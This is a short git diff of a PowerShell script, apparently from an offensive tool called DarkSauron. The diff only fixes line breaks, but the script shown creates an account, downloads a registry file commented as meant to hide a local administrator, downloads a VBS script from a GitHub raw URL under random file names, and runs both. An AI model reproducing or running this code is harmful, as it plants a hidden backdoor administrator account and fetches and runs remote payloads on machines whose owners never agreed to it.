@@ -38,16 +38,14 @@ create_account  -uname $uname -pword $pword
 
 #registry  to hide local admin
 $reg_file = random_text
-Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/admin.reg -OutFile
-"$reg_file.reg"
+Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/admin.reg -OutFile "$reg_file.reg"
 
 
 
 
 #visual basic script to registry
 $vbs_file = random_text
-Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/confirm.vbs -OutFile
-"$vbs_file.vbs"
+Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/confirm.vbs -OutFile "$vbs_file.vbs"
 
 #install the registry
 ./"$reg_file.reg";"$vbs_file.vbs"
